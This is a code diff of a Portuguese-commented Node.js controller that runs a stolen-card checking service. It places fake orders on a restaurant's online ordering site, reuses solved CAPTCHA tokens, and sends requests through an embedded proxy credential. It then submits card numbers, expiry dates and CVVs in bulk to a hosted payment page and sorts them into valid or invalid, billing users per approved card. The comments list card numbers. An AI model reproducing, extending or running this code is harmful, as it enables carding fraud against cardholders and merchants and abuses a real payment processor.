@@ -5,116 +5,116 @@ const Database = use('Database')
 const User = use('App/Models/User')
 const Card = use('App/Models/Card')
 const { addDays, parseISO } = require("date-fns");
-class VadateCardController {
+const Cache = use('Cache')
+class ValidateCardController {
     //função que pegar o codigo da url do link de checkout
     async GetId(id) {
-        // await this.GetCampos(id)
-        //    return
-        //id do usuario
+        try {
+
+            //verificar se o captcha já foi resolvido
+            let contadorCaptcha = 0
 
 
-        //verificar se o captcha já foi resolvido
-        let contadorCaptcha = 0
-        let time = setInterval(async () => {
-            contadorCaptcha++;
-            console.log('VERIFICANDO TOKEN_RECAPTCHA....')
-            //carregar cards que não foram testados ainda
-            const card = await User.find(id)
-            await card.loadMany({
-                cards: (builder) => builder.where('is_tested', false)
-            })
-            // esse trecho 
-            let stopRestart = card.toJSON().cards.length
-            if (!stopRestart) {
-                clearInterval(time)
-            }
-            //pegar token resolvido do recaptcha
-            let result = await Database
-                .table('url_tokens')
-                .where('user_id', id)
-                .first()
+            let time = setInterval(async () => {
+                contadorCaptcha++
+                console.log('VERIFICANDO TOKEN_RECAPTCHA....')
 
-            //fica verificando se o recaptcha foi resolvido
-            if (result) {
-                let token = await result.token_recaptcha
-                let error = await result.erro_token
-
-                if (token != null && error == null) {
-                    //função que enviar o form para o site e gravar o codigo da url do chechout
-                    await this.EnviarForm(id, token)
-                    //função que pegar os tres campos para proxima request POST
-                    await this.GetCampos(id)
-
-                    // zera a verifição do token recaptcha
-                    clearInterval(time)
-
-                }
 
                 // se ouver algum erro na resolução do captcha para tudo e recomeçar
-                if (error) {
-                    const up = await User.find(id)
-                    await up
-                        .url_token()
-                        .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 1 })
-
+                if (await Cache.has('user_id:' + id + '#erro_recaptcha#')) {
+                    //deletar contador recaptcha
+                    await Cache.pull(id + '#contador_captcha#')
+                    // deleta o token recaptcha já resolvido e expirado
+                    await Cache.forget('user_id:' + id + '#token_recaptcha#')
+                    //deleta o erro de token recaptcha se existir
+                    await Cache.forget('user_id:' + id + '#erro_recaptcha#')
+                    // seta o valor true para continuar a validação
+                    await Cache.forever('user_id:' + id + '#restart#', 1)
                     clearInterval(time)
                     console.log('erro na verificação do tokens')
                 }
-            }
-            console.log(contadorCaptcha)
-           
 
-        }, 5000);
+                //verifica se o token já foi resolvido
+
+                if (await Cache.has('user_id:' + id + '#token_recaptcha#')) {
+
+                    //pega o token já resolvido
+                    let token = await JSON.parse(await Cache.get('user_id:' + id + '#token_recaptcha#'))
+                    //pega o erro de resolução do token se existi
+                    let error = await JSON.parse(await Cache.get('user_id:' + id + '#erro_recaptcha#'))
+                    if (token != null && error == null) {
+                        // zera a verifição do token recaptcha
+                        clearInterval(time)
+                        //função que enviar o form para o site e gravar o codigo da url do chechout
+                        //#####
+                        await this.EnviarForm(id, token)
+                        //#####
+                        //função que pegar os tres campos para proxima request POST
+
+                    }
+                }
+
+                console.log(contadorCaptcha)
+
+            }, 5000);
+
+        } catch (error) {
+            await Cache.forever('user_id:' + id + '#log#type:GetId#', JSON.stringify(error.message))
+        }
 
     }
     // função que envia o form via post
     async EnviarForm(id, token) {
-        const date = await this.Pickup_time();
-        const curl = new Curl();
-        curl.setOpt('URL', 'https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/');
-        curl.setOpt('PROXY', 'http://f1ca55670d414417ad52b796e2242a4d:@proxy.crawlera.com:8010');
-        curl.setOpt('HEADER', 1);
-        curl.setOpt('FOLLOWLOCATION', 1);
-        curl.setOpt(Curl.option.POST, 1);
-        curl.setOpt('SSL_VERIFYPEER', 0);
-        curl.setOpt('SSL_VERIFYHOST', 0);
-        curl.setOpt(Curl.option.IGNORE_CONTENT_LENGTH, 136);
-        curl.setOpt(Curl.option.HTTPHEADER, [
-            'Host: amarithcafe.revelup.com',
-            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
-            'Accept: application/json',
-            'Referer: https://amarithcafe.revelup.com/weborder/?establishment=1',
-            'Content-Type: application/x-www-form-urlencoded',
-            'Connection: keep-alive']
-        );
+        try {
 
-        curl.setOpt(Curl.option.POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"' + date.create_date + '","pickup_time":"' + date.pickup_time + '","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}');
-        //pega o rsultado da request POST com o form enviado
-        await curl.on('end', async (statusCode, data) => {
-            //verifica se teve error.
-            //console.log(data)
-            if (data.indexOf("\"status\": \"ERROR\"") != -1) {
-                console.log('error')
+            const date = await this.Pickup_time();
+            const curl = new Curl();
+            curl.setOpt('URL', 'https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/');
+            curl.setOpt('PROXY', 'http://f1ca55670d414417ad52b796e2242a4d:@proxy.crawlera.com:8010');
+            curl.setOpt('HEADER', 1);
+            curl.setOpt('FOLLOWLOCATION', 1);
+            curl.setOpt(Curl.option.POST, 1);
+            curl.setOpt('SSL_VERIFYPEER', 0);
+            curl.setOpt('SSL_VERIFYHOST', 0);
+            curl.setOpt(Curl.option.IGNORE_CONTENT_LENGTH, 136);
+            curl.setOpt(Curl.option.HTTPHEADER, [
+                'Host: amarithcafe.revelup.com',
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
+                'Accept: application/json',
+                'Referer: https://amarithcafe.revelup.com/weborder/?establishment=1',
+                'Content-Type: application/x-www-form-urlencoded',
+                'Connection: keep-alive']
+            );
 
-            } else {
-                let inicio = data.indexOf("\"TransactionSetupID\": \"");
-                let codigo_url = await data.substr(inicio + 23, 36)
+            curl.setOpt(Curl.option.POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"' + date.create_date + '","pickup_time":"' + date.pickup_time + '","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}');
+            //pega o rsultado da request POST com o form enviado
+            await curl.on('end', async (statusCode, data) => {
+                //verifica se teve error.
+                //console.log(data)
+                if (data.indexOf("\"status\": \"ERROR\"") != -1) {
+                    console.log('error')
+                    await Cache.forever('user_id:' + id + '#erro_codigo_url#', JSON.stringify('ERROR'))
 
-                // pegar o codedigo da url de pagamento e colocar  no banco de dados
-                // e excluir o token do recaptcha
-                const setlINK = await User.find(id)
-                await setlINK
-                    .url_token()
-                    .update({ link_url: codigo_url, token_recaptcha: null })
+                } else {
+                    let inicio = data.indexOf("\"TransactionSetupID\": \"");
+                    let codigo_url = await data.substr(inicio + 23, 36)
+                    // salvar o codigo da url
+                    await Cache.forever('user_id:' + id + '#codigo_url#', JSON.stringify(codigo_url))
+                    // deleta o token recaptcha já expirado e usado
+                    await Cache.forget('user_id:' + id + '#token_recaptcha#')
+                    await this.GetCampos(id)
 
+                    console.log('codigo da url pego com sucesso')
 
-                console.log('codigo da url pego com sucesso')
+                }
+            });
+            // encerra o curl desta requisição
+            curl.on('error', curl.close.bind(curl))
+            curl.perform()
 
-            }
-        });
-        // encerra o curl desta requisição
-        curl.on('error', curl.close.bind(curl))
-        curl.perform()
+        } catch (error) {
+            await Cache.forever('user_id:' + id + '#log#type:EnviarForm#', JSON.stringify(error.message))
+        }
 
     }
     // essa função pegar data dinamica para colocar nas ordens
@@ -144,15 +144,9 @@ class VadateCardController {
     }
     // essa função pega os tres campos state, viewstate e validaton
     async GetCampos(id) {
-        // esperar 3 segundos os dados do link esta no banco de dados
-        setTimeout(async () => {
-            let result = await Database
-                .table('url_tokens')
-                .where('user_id', id)
-                .first()
-            //pegar o link do banco de dados
-            let code_url = result.link_url;
+        try {
 
+            let code_url = JSON.parse(await Cache.get('user_id:' + id + '#codigo_url#'));
             const curl1 = new Curl();
             curl1.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');
             curl1.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
@@ -181,216 +175,192 @@ class VadateCardController {
                 let STATEGENERATOR = await encodeURIComponent(data.substr(GETVIEWSTATEGENERATOR + 61, FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)))
                 let EVENTVALIDATION = await encodeURIComponent(data.substr(GETEVENTVALIDATION + 55, FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)))
                 //chamar função de valida o card
-
-                await this.ValidCard(id, STATE, STATEGENERATOR, EVENTVALIDATION)
+                // grava os campos no cache
+                await Cache.forever('user_id:' + id + '#campos_form#state#', JSON.stringify(STATE))
+                await Cache.forever('user_id:' + id + '#campos_form#generator#', JSON.stringify(STATEGENERATOR))
+                await Cache.forever('user_id:' + id + '#campos_form#validation#', JSON.stringify(EVENTVALIDATION))
+                // essa função valida os cards
+                await this.ValidCard(id)
             });
             curl1.on('error', curl1.close.bind(curl1))
             curl1.perform()
             console.log('Get campos ok')
-        }, 3000);
+
+        } catch (error) {
+            await Cache.forever('user_id:' + id + '#log#type:GetCampos#', JSON.stringify(error.message))
+        }
+
 
     }
-    async ValidCard(id, STATE, STATEGENERATOR, EVENTVALIDATION) {
+    async ValidCard(id) {
 
+        let time;
+        try {
 
-        // pegar os canais para enviar as menssagens
-        const aprovadas = await Ws.getChannel('status:*').topic('status:a' + id)
-        const reprovadas = await Ws.getChannel('status:*').topic('status:r' + id)
-        const testadas = await Ws.getChannel('status:*').topic('status:t' + id)
-        const recusadas = await Ws.getChannel('status:*').topic('status:rr' + id)
-        const creditos = await Ws.getChannel('status:*').topic('status:creditos' + id)
-        //pegar os cards que não foram testados
-        const cartoes = await User.find(id)
-        await cartoes.loadMany({
-            cards: (builder) => builder.where('is_tested', false)
-        })
+            // pegar os canais para enviar as menssagens
+            const aprovadas = await Ws.getChannel('status:*').topic('status:a' + id)
+            const reprovadas = await Ws.getChannel('status:*').topic('status:r' + id)
+            const testadas = await Ws.getChannel('status:*').topic('status:t' + id)
+            const recusadas = await Ws.getChannel('status:*').topic('status:rr' + id)
+            const creditos = await Ws.getChannel('status:*').topic('status:creditos' + id)
+            //pegar os campos cadastrados no cache
+            let STATE = await JSON.parse(await Cache.get('user_id:' + id + '#campos_form#state#'));
+            let STATEGENERATOR = await JSON.parse(await Cache.get('user_id:' + id + '#campos_form#generator#'));
+            let EVENTVALIDATION = await JSON.parse(await Cache.get('user_id:' + id + '#campos_form#validation#'));
+            //pegar o code_link do banco de dados
+            let code_url = await JSON.parse(await Cache.get('user_id:' + id + '#codigo_url#'))
 
-        //6509079001410445|12|2024|778
-        //6504867262783814|06|2023|000
-        //6504867262787880|06|2023|000
+            //6509079001410445|12|2024|778
+            //6504867262783814|06|2023|000
+            //6504867262787880|06|2023|000
+            if (await Cache.has('user_id:' + id + '#codigo_url#')
+                && await Cache.has('user_id:' + id + '#campos_form#validation#')
+                && await Cache.has('user_id:' + id + '#campos_form#generator#')
+                && await Cache.has('user_id:' + id + '#campos_form#state#')
+                && await Cache.has('user_id:' + id + '#resolvecards#')
+            ) {
 
-        if (cartoes != '') {
-            for await (let cards of cartoes.toJSON().cards) {
-                // espera um segundo para execulta cada card
-                setTimeout(async () => {
+                time = setInterval(async () => {
                     // pegar o codedigo da url que esta no banco de dados
-                    let result = await Database
-                        .table('url_tokens')
-                        .where('user_id', id)
-                        .first()
-                    //pegar o code_link do banco de dado
-                    let code_url = await result.link_url;
+                    let card_number = await Cache.get('user_id:' + id + '#resolvecards#');
+                    let card = await JSON.parse(await Cache.get('user_id:' + id + '#card#' + 'card_id:' + card_number))
 
-                    const curl2 = new Curl();
+                    if (card_number == await Cache.get('user_id:' + id + '#contadorcard#')) {
+                        clearInterval(time)
+                        await Cache.forever('user_id:' + id + '#restart#', 0)
+                    } else {
+                        const curl2 = new Curl();
 
-                    let PostString = await 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=' + STATE + '&__VIEWSTATEGENERATOR=' + STATEGENERATOR + '&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=' + EVENTVALIDATION + '&hdnCancelled=&cardNumber=' + cards.n + '&ddlExpirationMonth=' + cards.m + '&ddlExpirationYear=' + cards.a + '&CVV=' + cards.v + '&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&'
+                        let PostString = await 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=' + STATE + '&__VIEWSTATEGENERATOR=' + STATEGENERATOR + '&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=' + EVENTVALIDATION + '&hdnCancelled=&cardNumber=' + card.n + '&ddlExpirationMonth=' + card.m + '&ddlExpirationYear=' + card.a + '&CVV=' + card.v + '&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&'
 
-                    curl2.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');
+                        curl2.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');
 
-                    curl2.setOpt('HEADER', 1);
-                    curl2.setOpt(Curl.option.POST, 1);
-                    curl2.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
-                    curl2.setOpt('FOLLOWLOCATION', 1);
-                    curl2.setOpt('SSL_VERIFYPEER', 0);
-                    curl2.setOpt('SSL_VERIFYHOST', 0);
-                    curl2.setOpt('CONNECTTIMEOUT', 2);
-                    curl2.setOpt('FAILONERROR', 1);
-                    curl2.setOpt(Curl.option.HTTPHEADER, [
-                        'Host: transaction.hostedpayments.com',
-                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
-                        'Accept: */*',
-                        'X-Requested-With: XMLHttpRequest',
-                        'X-MicrosoftAjax: Delta=true',
-                        'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
-                        'Connection: keep-alive',
-                        'Referer: https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '',
-                    ]);
+                        curl2.setOpt('HEADER', 1);
+                        curl2.setOpt(Curl.option.POST, 1);
+                        curl2.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
+                        curl2.setOpt('FOLLOWLOCATION', 1);
+                        curl2.setOpt('SSL_VERIFYPEER', 0);
+                        curl2.setOpt('SSL_VERIFYHOST', 0);
+                        curl2.setOpt('CONNECTTIMEOUT', 2);
+                        curl2.setOpt('FAILONERROR', 1);
+                        curl2.setOpt(Curl.option.HTTPHEADER, [
+                            'Host: transaction.hostedpayments.com',
+                            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
+                            'Accept: */*',
+                            'X-Requested-With: XMLHttpRequest',
+                            'X-MicrosoftAjax: Delta=true',
+                            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
+                            'Connection: keep-alive',
+                            'Referer: https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '',
+                        ]);
 
-                    curl2.setOpt(Curl.option.POSTFIELDS, PostString)
-
-                    await curl2.on('end', async (statusCode, data) => {
-
-                        try {
+                        curl2.setOpt(Curl.option.POSTFIELDS, PostString)
+                        await curl2.on('end', async (statusCode, data) => {
 
                             let GETR = await data.indexOf('<b>Error</b>:');
                             let ENDR = await data.indexOf('</span>', GETR + 12);
-                            let Resultado = await data.substr(GETR + 13, ENDR - (GETR + 13))
-                          
-                            // TransactionSetupID expired
-                            if (Resultado != '') {
+                            const result = await data.substr(GETR + 13, ENDR - (GETR + 13))
 
-                                if (Resultado.trim() == 'TransactionSetupID expired') {
-                                    const ur = await User.find(id)
-                                    await ur
-                                        .url_token()
-                                        .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 1 })
+                            console.log(result)
+                            if (card_number != await Cache.get('user_id:' + id + '#contadorcard#')) {
+
+                                switch (result.trim()) {
+                                    case 'Call Issuer':
+                                        await Cache.increment('user_id:' + id + '#resolvecards#')
+                                        const b = await User.find(id)
+                                        await Database
+                                            .table('users')
+                                            .where('id', id)
+                                            .decrement('balance', 1)
 
 
+                                        await Cache.increment('user_id:' + id + '#aprovadas#')
+                                        await Cache.increment('user_id:' + id + '#testadas#')
+                                        if (aprovadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#aprovadas#')
+                                            aprovadas.broadcastToAll('message', { cont: cont, msg: '<b class="badge badge-primary">#Aprovada</b> <b class="badge badge-light">' + card.n + '</b> <b class="badge badge-info">Retorno: Válido</b> <b class="badge badge-success">#el-patron</b><br>' })
+                                        }
+                                        if (testadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#testadas#')
+                                            testadas.broadcastToAll('message', cont)
+                                        }
+                                        if (creditos) {
+
+                                            await creditos.broadcastToAll('message', b.balance)
+                                        }
+                                        await Cache.forget('user_id:' + id + '#card#' + 'card_id:' + card_number)
+                                        break;
+                                    case 'Declined':
+                                        await Cache.increment('user_id:' + id + '#resolvecards#')
+                                        await Cache.increment('user_id:' + id + '#recusadas#')
+                                        await Cache.increment('user_id:' + id + '#testadas#')
+                                        if (recusadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#recusadas#')
+                                            recusadas.broadcastToAll('message', cont)
+                                        }
+                                        if (testadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#testadas#')
+                                            testadas.broadcastToAll('message', cont)
+                                        }
+                                        await Cache.forget('user_id:' + id + '#card#' + 'card_id:' + card_number)
+                                        break;
+                                    case 'INVALID CARD INFO':
+
+                                        await Cache.increment('user_id:' + id + '#resolvecards#')
+                                        await Cache.increment('user_id:' + id + '#reprovadas#')
+                                        await Cache.increment('user_id:' + id + '#testadas#')
+                                        if (reprovadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#reprovadas#')
+                                            reprovadas.broadcastToAll('message', { cont: cont, msg: '<b class="badge badge-danger">#Reprovada</b> <b class="badge badge-light">' + card.n + '</b> <b class="badge badge-danger">INFORMAÇÕES DE CARTÃO: INVÁLIDAS</b><br>' })
+                                        }
+                                        if (testadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#testadas#')
+                                            testadas.broadcastToAll('message', cont)
+                                        }
+                                        await Cache.forget('user_id:' + id + '#card#' + 'card_id:' + card_number)
+
+                                        break;
+                                    case 'TransactionSetupID expired':
+                                        clearInterval(time)
+                                        await Cache.forever('user_id:' + id + '#restart#', 1)
+
+                                        break;
+
+                                    default:
+                                        await Cache.increment('user_id:' + id + '#resolvecards#')
+                                        await Cache.increment('user_id:' + id + '#reprovadas#')
+                                        await Cache.increment('user_id:' + id + '#testadas#')
+                                        if (reprovadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#reprovadas#')
+                                            reprovadas.broadcastToAll('message', { cont: cont, msg: '<b class="badge badge-danger">#Reprovada</b> <b class="badge badge-light">' + card.n + '</b> <b class="badge badge-danger">Retorno: Inválido</b><br>' })
+                                        }
+                                        if (testadas) {
+                                            let cont = await Cache.get('user_id:' + id + '#testadas#')
+                                            testadas.broadcastToAll('message', cont)
+                                        }
+                                        await Cache.forget('user_id:' + id + '#card#' + 'card_id:' + card_number)
+                                        break;
                                 }
-                                if (Resultado.trim() == 'Declined') {
+                            }
 
-                                    await upcard2.save()
-                                    await Database
-                                        .table('cards')
-                                        .where('id', cards.id)
-                                        .update({ is_tested: 1, is_declined: 1 })
+                        });
+
+                        curl2.on('error', curl2.close.bind(curl2))
+                        curl2.perform()
+                    }
+
+                }, 3000);
 
 
-                                }
-                                if (Resultado.trim() == 'Call Issuer') {
-                                    const balance = await User.find(id)
-                                    await Database
-                                        .table('users')
-                                        .where('id', id)
-                                        .update('balance', parseInt(balance.balance) - 1)
-                                    await Database
-                                        .table('cards')
-                                        .where('id', cards.id)
-                                        .update({ is_tested: 1, is_valid: 1 })
-
-                                    if (aprovadas) {
-
-                                        const A = await User.find(id)
-                                        await A.loadMany({
-                                            cards: (builder) => builder.where('is_valid', true)
-                                        })
-                                        let cont = A.toJSON().cards.length
-                                        aprovadas.broadcastToAll('message', { cont: cont, msg: '<b class="badge badge-primary">#Aprovada</b> <b class="badge badge-light">' + cards.n + '</b> <b class="badge badge-info">Retorno: Válido</b> <b class="badge badge-success">#el-patron</b><br>' })
-                                    }
-                                    console.log(Resultado)
-                                    console.log('APROVADO')
-
-                                } else {
-
-                                    await Database
-                                        .table('cards')
-                                        .where('id', cards.id)
-                                        .update('is_tested', 1)
-
-                                    if (reprovadas) {
-                                        const T = await User.find(id)
-                                        await T.loadMany({
-                                            cards: (builder) => builder.where('is_tested', true)
-                                        })
-                                        let r = await T.toJSON().cards.length
-                                        console('testados: ' + r)
-                                        const R = await User.find(id)
-                                        await R.loadMany({
-                                            cards: (builder) => builder.where('is_valid', false)
-                                        })
-                                        let cont = await R.toJSON().cards.length
-                                        console.log('validos: ' + cont)
-                                        reprovadas.broadcastToAll('message', { cont: r - cont, msg: '<b class="badge badge-danger">#Reprovada</b> <b class="badge badge-light">' + cards.n + '</b> <b class="badge badge-danger">Retorno: Inválido</b><br>' })
-                                    }
-                                    console.log(Resultado)
-                                    console.log('REPROVADO')
-                                }
-                            } 
-
-                        } catch (error) {
-                            console.log('expirado ' + error.message)
-                            return
-                        }
-
-                    });
-
-                    curl2.on('error', curl2.close.bind(curl2))
-                    curl2.perform()
-                }, 1000);
             }
 
+        } catch (error) {
 
-        } else {
-
-            const u = await User.find(id)
-            await u
-                .url_token()
-                .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 0 })
-
+            await Cache.forever('user_id:' + id + '#log#type:ValidCard#', JSON.stringify(error.message))
         }
-        setTimeout(async () => {
-
-            //atualizar dados do frontend via websocsket
-            if (testadas) {
-                const T = await User.find(id)
-                await T.loadMany({
-                    cards: (builder) => builder.where('is_tested', true)
-                })
-                if (T != undefined) {
-                    let cont = T.toJSON().cards.length
-                    console.log('testados: ' + cont)
-                    testadas.broadcastToAll('message', cont)
-                }
-
-            }
-            if (recusadas) {
-
-                const RR = await User.find(id)
-                await RR.loadMany({
-                    cards: (builder) => builder.where('is_declined', true)
-                })
-                if (RR != undefined) {
-                    let cont = RR.toJSON().cards.length
-                    console.log('recusados: ' + cont)
-                    recusadas.broadcastToAll('message', cont)
-                }
-
-            }
-            if (creditos) {
-                let result = await Database
-                    .table('users')
-                    .where('id', id)
-                    .first()
-                await creditos.broadcastToAll('message', result.balance)
-            }
-
-        }, 14000);
-
 
     }
 
-
-
 }
 
-module.exports = VadateCardController
+module.exports = ValidateCardController
